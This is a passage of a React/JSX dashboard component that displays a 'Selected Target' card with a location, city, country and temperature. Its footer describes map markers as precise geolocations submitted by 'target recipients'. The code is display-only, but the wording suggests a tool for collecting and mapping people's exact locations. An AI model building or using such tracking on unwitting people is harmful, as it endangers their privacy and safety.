                <div className={`absolute bottom-3 left-3 right-3 z-[1000] p-3 rounded-xl border shadow-md flex items-center justify-between gap-4 backdrop-blur-md ${
                  theme === 'light' ? 'bg-white/90 border-slate-200 text-slate-800' : 'bg-slate-900/90 border-white/10 text-slate-200'
                }`}>
                  <div className="min-w-0">
                    <span className="text-[9px] uppercase tracking-wider font-extrabold text-rose-500 block">Selected Target:</span>
                    <span className="text-xs font-bold block truncate">{selectedLocation.ref}</span>
                    <span className="text-[10px] text-slate-400 block truncate mt-0.5">
                      {selectedLocation.city}, {selectedLocation.country}
                    </span>
                  </div>

                  <span className="text-xs font-mono bg-sky-500/10 text-sky-400 px-2 py-1 rounded border border-sky-400/10 shrink-0">
                    {selectedLocation.temp}
                  </span>
                </div>
              )}
            </div>

            {/* Instruction Footer */}
            <p className="text-[10px] text-slate-400 mt-3 leading-snug font-sans">
              All map coordinates correspond directly to high-accuracy geolocations submitted by target recipients. Click any marker to view specific ambient weather details at that location.
            </p>
          </div>

        </div>

      </main>

    </div>
  );
}
